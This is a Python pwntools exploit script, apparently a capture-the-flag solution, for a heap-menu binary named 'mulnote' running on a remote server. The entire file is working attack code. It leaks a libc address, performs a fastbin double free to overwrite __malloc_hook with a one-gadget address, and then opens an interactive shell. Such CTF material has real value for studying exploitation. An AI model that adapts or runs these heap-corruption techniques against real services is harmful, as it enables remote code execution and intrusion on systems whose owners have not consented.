#coding=utf-8
from pwn import *
local = 0
exec_file="./mulnote"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("112.126.101.96",9999)
    libc=ELF("./libc.so")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x000000000000D52)
    b *($text_base+0x0000000000012F0)
    b *($text_base+0x000000000000FB5)
    '''
    gdb.attach(a,script)

def menu(idx):
    a.sendlineafter(">",idx)
def add(size,content):
    menu('C')
    a.sendlineafter("size>",str(size))
    a.sendafter(">",content)
def delete(idx):
    menu('R')
    a.sendlineafter(">",str(idx))
def show():
    menu('S')
def edit(idx,content):
    menu('E')
    a.sendlineafter("index>",str(idx))
    a.sendafter(">",content)
add(0x88,'A')#0
add(0x18,'A')#1
delete(0)
show()
a.recvuntil("[0]:\n")
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["__malloc_hook"]-0x10-88
print hex(libc_base)
#debug()
add(0x88,'A\n')#2
add(0x68,'A\n')#3
add(0x68,'A\n')#4
#add(0x70,'A\n')#4
#debug()
delete(3)
delete(4)
delete(3)
__malloc_hook=libc_base+libc.symbols["__malloc_hook"]
#edit(3,p64(__malloc_hook-0x23))
#debug()
#add(0x70,'A')
#add(0x70,'A'*0x13+p64(libc_base))
add(0x68,p64(__malloc_hook-0x23))
add(0x68,'A')
add(0x68,'A')
add(0x68,'A'*0x13+p64(libc_base+0x4526a))
menu('C')
a.sendlineafter("size>",str(10))
a.interactive()



 






